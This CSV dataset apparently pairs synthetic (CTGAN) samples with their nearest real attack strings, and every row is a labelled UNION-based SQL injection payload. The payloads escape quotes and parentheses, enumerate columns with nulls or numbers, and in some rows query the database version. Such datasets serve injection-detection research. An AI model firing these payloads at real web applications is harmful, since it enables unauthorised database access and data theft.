id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000204,attack,union,"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",nearest_attack_euclidean,R001528,4.546167772137753
CTGAN_000205,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R001540,6.048300457403483
CTGAN_000206,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000203,5.775279003118734
CTGAN_000207,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R001158,5.753645313697248
CTGAN_000208,attack,union,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001600,6.782159429782591
CTGAN_000209,attack,union," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000142,10.022713997466616
CTGAN_000210,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000281,4.029701189304684
CTGAN_000211,attack,union,"-3955 where 7276  =  7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",nearest_attack_euclidean,R001010,5.318526871783332
CTGAN_000212,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,5.776251585541136
CTGAN_000213,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R001261,5.873071906110724
CTGAN_000214,attack,union,"1   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000514,4.888087089424557
CTGAN_000215,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000767,4.788228077087106
CTGAN_000216,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001436,7.239597607168648
CTGAN_000217,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000755,6.656168498712682
CTGAN_000218,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,6.143999223530857
CTGAN_000219,attack,union,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",nearest_attack_euclidean,R000745,6.997046310453721
CTGAN_000220,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R001029,3.3981417558746534
CTGAN_000221,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001123,5.559332400984976
CTGAN_000222,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000281,5.496337193814957
CTGAN_000223,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R001002,3.924063361158251
CTGAN_000224,attack,union,"1""  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000625,4.210861860399717
CTGAN_000225,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000970,4.171503828737279
CTGAN_000226,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000246,5.143355898881906
CTGAN_000227,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001287,6.194699705171435
CTGAN_000228,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001123,5.9249689552816704
CTGAN_000229,attack,union," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000182,7.375366482740326
CTGAN_000230,attack,union,"1  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001199,5.9315793653194
CTGAN_000231,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R001181,5.777488995021742
CTGAN_000232,attack,union,"-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",nearest_attack_euclidean,R001337,9.142527715535225
CTGAN_000233,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,5.514052011854498
CTGAN_000234,attack,union,"1   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000775,5.182836821407444
CTGAN_000235,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000487,4.690593863054009
CTGAN_000236,attack,union,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",nearest_attack_euclidean,R001572,5.967579043002453
CTGAN_000237,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001533,6.344183848790637
CTGAN_000238,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000507,7.079537466500849
CTGAN_000239,attack,union,"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",nearest_attack_euclidean,R001180,4.119212666227211
CTGAN_000240,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,7.746443264617566
CTGAN_000241,attack,union,"-3282'  )   union all select 9002,9002,9002,9002,9002#",nearest_attack_euclidean,R001454,4.93123049721612
CTGAN_000242,attack,union,"-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",nearest_attack_euclidean,R000720,4.891754929973202
CTGAN_000243,attack,union,"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",nearest_attack_euclidean,R001511,4.711075697866087
CTGAN_000244,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000261,6.29202215843977
CTGAN_000245,attack,union,"-2365   )    )    union all select 8190,8190#",nearest_attack_euclidean,R001634,5.1365383264079805
CTGAN_000246,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000322,6.531294743075373
CTGAN_000247,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000639,4.802417394811972
CTGAN_000248,attack,union,"1%'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001635,4.82765139979396
CTGAN_000249,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000463,4.9189211920204645
CTGAN_000250,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,3.799904680317234
CTGAN_000251,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001662,5.579852896322819
CTGAN_000252,attack,union,"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",nearest_attack_euclidean,R001180,4.6178513784724124
CTGAN_000253,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R001616,6.394678149114808
CTGAN_000254,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001110,5.175563956844721
CTGAN_000255,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,6.427898433658225
CTGAN_000256,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,5.626778415818505
CTGAN_000257,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000811,5.479323054355206
CTGAN_000258,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000767,4.208291174501847
CTGAN_000259,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000974,5.4631078500117765
CTGAN_000260,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001533,5.909750502318598
CTGAN_000261,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001160,7.176892954596168
CTGAN_000262,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001248,5.443825107710934
CTGAN_000263,attack,union,"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",nearest_attack_euclidean,R000597,5.488192687705548
CTGAN_000264,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001670,4.848459649072388
CTGAN_000265,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,5.15370536237613
CTGAN_000266,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000047,6.359051733902496
CTGAN_000267,attack,union,"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",nearest_attack_euclidean,R000659,4.015739434887518
CTGAN_000268,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000693,6.319831179162633
CTGAN_000269,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001262,4.140427272688676
CTGAN_000270,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R001164,3.6219838503741713
CTGAN_000271,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R000859,4.2472038798015
CTGAN_000272,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000525,5.143037398601675
CTGAN_000273,attack,union,"-9297  )   union all select 6841,6841,6841,6841,6841--",nearest_attack_euclidean,R001166,4.882319518831086
CTGAN_000274,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R001452,4.704550026640049
CTGAN_000275,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000300,5.4707436608363
CTGAN_000276,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000758,5.209305909487079
CTGAN_000277,attack,union,"1' where 7104  =  7104 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000232,6.214817642211963
CTGAN_000278,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R001164,5.484152396132357
CTGAN_000279,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000325,4.755003006184008
CTGAN_000280,attack,union,"1""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000955,3.728520942452593
CTGAN_000281,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000300,5.387692465250345
CTGAN_000282,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000826,5.134875446214571
CTGAN_000283,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000286,4.910024271237155
CTGAN_000284,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000463,5.487578448983725
CTGAN_000285,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R001187,5.484845085562022
CTGAN_000286,attack,union,-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,nearest_attack_euclidean,R001126,6.739833822371907
CTGAN_000287,attack,union,"-2365   )    )    union all select 8190,8190#",nearest_attack_euclidean,R001634,5.818798660841515
CTGAN_000288,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000246,4.656460163691248
CTGAN_000289,attack,union,"-5245""   )    )     )   union all select 8106,8106,8106#",nearest_attack_euclidean,R001074,4.523600849117581
CTGAN_000290,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000965,3.565867453664888
CTGAN_000291,attack,union,1  )   union all select null--,nearest_attack_euclidean,R001675,5.690867866081583
CTGAN_000292,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R001190,4.741544842126187
CTGAN_000293,attack,union,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",nearest_attack_euclidean,R000581,6.342898506133355
CTGAN_000294,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001284,5.79647272405677
CTGAN_000295,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,6.448647114285905
CTGAN_000296,attack,union,"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",nearest_attack_euclidean,R001350,5.485663251000263
CTGAN_000297,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R000812,4.427228227572416
CTGAN_000298,attack,union,"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",nearest_attack_euclidean,R001332,5.767050924926007
CTGAN_000299,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,6.9824097138583925
CTGAN_000300,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001257,3.467242010453051
CTGAN_000301,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000559,5.664089482978955
CTGAN_000302,attack,union,"1  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000457,4.893726686437801
CTGAN_000303,attack,union,"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001532,6.368298337914698
CTGAN_000304,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000824,5.927414546920709
CTGAN_000305,attack,union,"1%'   )    )    union all select null,null,null#",nearest_attack_euclidean,R000839,6.164063760038379
CTGAN_000306,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000582,5.494302512807494
CTGAN_000307,attack,union,"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",nearest_attack_euclidean,R000329,4.552483700871298
CTGAN_000308,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,6.730245559015605
CTGAN_000309,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R001317,4.837601245979303
CTGAN_000310,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000608,4.321295699416301
CTGAN_000311,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R001122,6.2263313390359825
CTGAN_000312,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000692,4.673559605341941
CTGAN_000313,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000903,5.55115988258199
CTGAN_000314,attack,union,"-5169""   )    )    union all select 6198,6198,6198,6198--",nearest_attack_euclidean,R001363,6.889469284977224
CTGAN_000315,attack,union,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",nearest_attack_euclidean,R000695,6.140100975962932
CTGAN_000316,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R001178,6.417619503939405
CTGAN_000317,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001284,5.8453884373089995
CTGAN_000318,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000439,4.540946388373577
CTGAN_000319,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000493,4.479307589411175
CTGAN_000320,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000460,6.018374197318356
CTGAN_000321,attack,union,"-1033 union all select 8731,8731,8731,8731,8731,8731--",nearest_attack_euclidean,R000979,4.91896162630663
CTGAN_000322,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,7.624068622329426
CTGAN_000323,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001407,4.928998009855048
CTGAN_000324,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000878,4.000871821277937
CTGAN_000325,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,3.36555186868948
CTGAN_000326,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R001470,4.806722996142843
CTGAN_000327,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000463,6.283200724428351
CTGAN_000328,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R001335,5.8467718214475655
CTGAN_000329,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001361,4.137946812929661
CTGAN_000330,attack,union,"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",nearest_attack_euclidean,R001116,5.4774578459350804
CTGAN_000331,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001533,6.108702937046977
CTGAN_000332,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001279,3.9804287608277438
CTGAN_000333,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000343,5.928825416771783
CTGAN_000334,attack,union,"1""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R001170,5.242396520676168
CTGAN_000335,attack,union,"-1432""   )    )    union all select 9008,9008,9008#",nearest_attack_euclidean,R001064,6.0661157623517274
CTGAN_000336,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001284,4.717176748653365
CTGAN_000337,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001120,4.387356558341252
CTGAN_000338,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000493,5.740914416981984
CTGAN_000339,attack,union,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",nearest_attack_euclidean,R000598,3.913391248083601
CTGAN_000340,attack,union,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",nearest_attack_euclidean,R000632,5.076069271941822
CTGAN_000341,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000945,3.2637479086844627
CTGAN_000342,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000774,6.153598711146719
CTGAN_000343,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001257,6.83718402765754
CTGAN_000344,attack,union,"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",nearest_attack_euclidean,R000914,7.360003931595544
CTGAN_000345,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000811,6.232014071913374
CTGAN_000346,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001436,6.147031928549416
CTGAN_000347,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R001055,5.001107866703645
CTGAN_000348,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001120,5.332324313778085
CTGAN_000349,attack,union,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",nearest_attack_euclidean,R000583,6.533809726849904
CTGAN_000350,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,5.2343576090585024
CTGAN_000351,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000965,5.631000073832094
CTGAN_000352,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R001227,4.498475358412347
CTGAN_000353,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R001340,5.972132193994507
CTGAN_000354,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000755,4.510574471514644
CTGAN_000355,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000204,7.128634776943285
CTGAN_000356,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,4.348732111473035
CTGAN_000357,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000974,4.3390908165407485
CTGAN_000358,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000488,5.07244197385083
CTGAN_000359,attack,union,"1'  )   where 7658  =  7658 union all select null,null#",nearest_attack_euclidean,R000589,6.480215897469071
CTGAN_000360,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001289,3.9272111782395265
CTGAN_000361,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,5.9355724421783655
CTGAN_000362,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,6.232478906479917
CTGAN_000363,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001668,4.086924983057799
CTGAN_000364,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,7.379751905810823
CTGAN_000365,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,4.731687337492709
CTGAN_000366,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000940,8.316737651440075
CTGAN_000367,attack,union,"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000971,5.203767238400136
CTGAN_000368,attack,union,"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",nearest_attack_euclidean,R000377,5.013764432013823
CTGAN_000369,attack,union,"1  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001417,5.533586913523054
CTGAN_000370,attack,union,"-4305   )    )     )   union all select 2401,2401--",nearest_attack_euclidean,R000306,6.242164743579207
CTGAN_000371,attack,union,"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",nearest_attack_euclidean,R001225,6.761961918940447
CTGAN_000372,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001287,5.48123717450924
CTGAN_000373,attack,union,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",nearest_attack_euclidean,R000374,6.205363538125779
CTGAN_000374,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000257,5.247854519070163
CTGAN_000375,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000902,4.975847648118123
CTGAN_000376,attack,union,"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",nearest_attack_euclidean,R000485,5.629769102627218
CTGAN_000377,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000903,6.192309471815073
CTGAN_000378,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R001163,3.897872340712586
CTGAN_000379,attack,union,"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",nearest_attack_euclidean,R001584,4.8966492707378455
CTGAN_000380,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,5.41899747093016
CTGAN_000381,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000354,4.911508721305733
CTGAN_000382,attack,union,"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",nearest_attack_euclidean,R001353,5.333461433331391
CTGAN_000383,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000608,4.424811068047173
CTGAN_000384,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000965,6.710621626227166
CTGAN_000385,attack,union,"1""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R001170,5.415298313364716
CTGAN_000386,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,5.474010100946383
CTGAN_000387,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R001502,6.504809737966903
CTGAN_000388,attack,union,"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",nearest_attack_euclidean,R001584,4.646102118883492
CTGAN_000389,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000594,4.3457739650064315
CTGAN_000390,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001287,5.377508559113264
CTGAN_000391,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000945,5.281597865503986
CTGAN_000392,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000639,4.794721829532762
CTGAN_000393,attack,union," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000182,7.7943178153308965
CTGAN_000394,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R001394,4.0860128242990665
CTGAN_000395,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001628,4.257408683788113
CTGAN_000396,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000281,4.267241160365128
CTGAN_000397,attack,union,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",nearest_attack_euclidean,R000614,6.440973596995033
CTGAN_000398,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R001314,4.787726523935672
CTGAN_000399,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R001540,5.696924079236123
CTGAN_000400,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,4.534432492210342
CTGAN_000401,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R001440,4.4668587949422855
CTGAN_000402,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000528,8.785343948780204
CTGAN_000403,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R000669,5.0190786966705145
CTGAN_000404,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,4.476445906531483
